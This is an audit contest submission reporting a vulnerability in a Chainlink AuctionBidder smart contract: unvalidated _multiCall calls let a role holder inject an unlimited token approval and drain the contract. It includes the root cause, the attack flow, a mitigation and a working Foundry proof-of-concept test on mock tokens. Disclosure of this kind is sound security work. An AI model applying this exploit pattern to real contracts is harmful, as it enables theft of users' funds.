Severity rating *
High severity

Title *
Summarize your findings for the bug or vulnerability. (This will be the issue title, max length 255)

Unrestricted approve() via _multiCall in auctionCallback grants attacker unlimited token allowance

Links to root cause *
Provide GitHub links, including line numbers, to the root cause of the vulnerability. (How to link to line numbers on GitHub)


https://github.com/code-423n4/2026-03-chainlink/blob/main/src/AuctionBidder.sol#L97-L112

https://github.com/code-423n4/2026-03-chainlink/blob/main/src/Caller.sol#L49-L62
✕
Add another link

Vulnerability details *
Link to all referenced sections of code in GitHub. You can use markdown including markdown math notation in this field

Edit
Preview
Finding description and impact
Root Cause
AuctionBidder.auctionCallback()
(L97–L112) decodes
attacker-controlled Call[] data and passes it directly to Caller._multiCall()
(L49–L62) with zero validation
on target address or function selector:

// AuctionBidder.sol L109
_multiCall(calls);                                    // ← arbitrary calls execute here

// AuctionBidder.sol L111
IERC20(assetOut).forceApprove(msg.sender, amountOut); // ← only resets allowance[AB][auction]
forceApprove updates allowance[AuctionBidder][auction] — a different storage slot from
allowance[AuctionBidder][attacker]. A rogue approve() injected via _multiCall therefore survives the
subsequent forceApprove call.

Attack Flow (2 transactions)
Tx 1 — inject rogue approve:
A holder of AUCTION_BIDDER_ROLE calls bid() with a solution array containing:

Call({ target: address(LINK), data: abi.encodeWithSelector(IERC20.approve.selector, attacker, type(uint256).max) })
The call chain is:

bid() → auction.bid() → auctionCallback() → _multiCall([approve(attacker, MAX)])
                                           → LINK.forceApprove(auction, amountOut)  // different slot, rogue approval
intact
Tx 2 — drain:

LINK.transferFrom(address(auctionBidder), attacker, LINK.balanceOf(auctionBidder));
Impact
Complete drain of any ERC20 token held by AuctionBidder (not limited to assetOut). The contract accumulates
token balances over time as it performs bids; all such balances are at risk.

Severity is High (downgraded from Critical) because AUCTION_BIDDER_ROLE is admin-granted and not permissionless.

Distinction from direct-transfer variant (same root cause)
Unlike a direct transfer() injection (single-tx drain), the approve() variant:

Operates across two separate transactions, bypassing any single-tx reentrancy considerations
Persists silently — the rogue allowance remains after the legitimate bid completes with no on-chain indication
Recommended mitigation steps
Apply a target/selector allowlist inside _multiCall or auctionCallback:

// Example: restrict calls to pre-approved (target, selector) pairs
mapping(address => mapping(bytes4 => bool)) public allowedCalls;

function auctionCallback(...) external whenNotPaused {
    ...
    for (uint256 i = 0; i < calls.length; i++) {
        bytes4 selector = bytes4(calls[i].data);
        require(allowedCalls[calls[i].target][selector], "Call not allowed");
    }
    _multiCall(calls);
    IERC20(assetOut).forceApprove(msg.sender, amountOut);
}
Alternatively, after _multiCall completes, revoke all non-assetOut allowances or restrict _multiCall targets
to only DEX/swap contracts required for bid execution.


Proof of Concept (PoC) *
To be considered for evaluation, you must submit a complete PoC including minimal yet functional exploit code that effectively demonstrates the issue.

Edit
Preview
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

/**

H-01 PoC: Unrestricted approve() via _multiCall
Run: forge test --match-test testH01_UnrestrictedApproveViaMultiCall -vvvv
Place this file in test/poc/ alongside C4PoC.t.sol
*/
import {C4PoC} from "test/poc/C4PoC.t.sol";
import {Caller} from "src/Caller.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {console2} from "forge-std/console2.sol";

contract H01_PoC is C4PoC {

  function testH01_UnrestrictedApproveViaMultiCall() public {
      // ── Setup: start USDC auction, fund AuctionBidder ──────────────────
      uint256 auctionAmount = 1_000e6;
      _startAuctionAndSkip(address(mockUSDC), auctionAmount, 5_000);

      uint256 linkForBid     = _getAssetOutAmount(address(mockUSDC), auctionAmount);
      uint256 linkTreasury   = 9_000e18; // simulates pre-existing LINK balance
      _fundBidder(linkForBid + linkTreasury);

      uint256 bidderLinkBefore   = mockLINK.balanceOf(address(auctionBidder));
      uint256 attackerLinkBefore = mockLINK.balanceOf(attacker);
      console2.log("[Setup] AuctionBidder LINK:", bidderLinkBefore / 1e18, "LINK");

      // ── Tx 1: inject rogue approve(attacker, MAX) in solution ──────────
      // _multiCall has no target/selector validation — any call executes
      Caller.Call[] memory maliciousSolution = new Caller.Call[](1);
      maliciousSolution[0] = Caller.Call({
          target : address(mockLINK),
          data   : abi.encodeWithSelector(IERC20.approve.selector, attacker, type(uint256).max)
      });

      // bidder holds AUCTION_BIDDER_ROLE (see C4PoC.setUp())
      _bidWithSolution(address(mockUSDC), auctionAmount, maliciousSolution);

      // forceApprove(auction, amountOut) only touches allowance[AB][auction].
      // allowance[AB][attacker] is a SEPARATE mapping entry — untouched.
      uint256 rogueAllowance = mockLINK.allowance(address(auctionBidder), attacker);
      console2.log("[Tx 1] Rogue allowance for attacker:", rogueAllowance);
      assertEq(rogueAllowance, type(uint256).max, "rogue approval must persist");

      // ── Tx 2: drain remaining LINK treasury ───────────────────────────
      uint256 remaining = mockLINK.balanceOf(address(auctionBidder));
      console2.log("[Tx 2] Draining:", remaining / 1e18, "LINK");

      vm.prank(attacker);
      mockLINK.transferFrom(address(auctionBidder), attacker, remaining);

      assertEq(mockLINK.balanceOf(address(auctionBidder)), 0, "AuctionBidder must be drained");
      assertEq(mockLINK.balanceOf(attacker) - attackerLinkBefore, remaining, "attacker received all LINK");

      console2.log("[CONFIRMED] LINK stolen:", remaining / 1e18, "LINK");
  }
}

Once you submit a finding, you will only be able to edit or withdraw within 2 hours. After that, it will be permanently locked.